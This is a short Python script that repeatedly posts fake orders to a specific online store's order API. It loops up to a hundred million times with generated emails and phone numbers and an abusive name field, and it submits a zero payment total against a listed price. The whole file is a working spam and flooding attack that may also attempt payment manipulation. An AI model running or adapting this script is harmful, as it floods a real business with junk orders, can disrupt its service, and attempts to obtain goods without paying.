import random
import time
import requests
import datetime
import json

url = "https://api-order.eriksanjaya.com/api/order/store"

waktu = str(datetime.datetime.now())
i = 1
while (i<100000000):
    i = i+1
    try:
        obj = {
            'dnsname[]' : 'nla',
            'productname[]' : 'Login Page NLA',
            'productprice[]' : 70000,
            'nama' : 'JGN SUKA SPAM KNTL',
            'email' : 'asdhjasjdjas'+str(i)+'@gmail.com',
            'whatsapp' : '25552255855'+str(i),
            'total' : 70000,
            'diskon' : 50,
            'total_bayar': 0,
        }
        hasil = requests.post(url, data=obj)
        print("Respon " +str(hasil.status_code)+' '+str(hasil.text)+' ke  '+str(i) + " Pada : " + waktu)
    except KeyboardInterrupt:
        i=1000000000
    except:
        print("gagal post ke: " + str(i) + " Pada : " + waktu)
        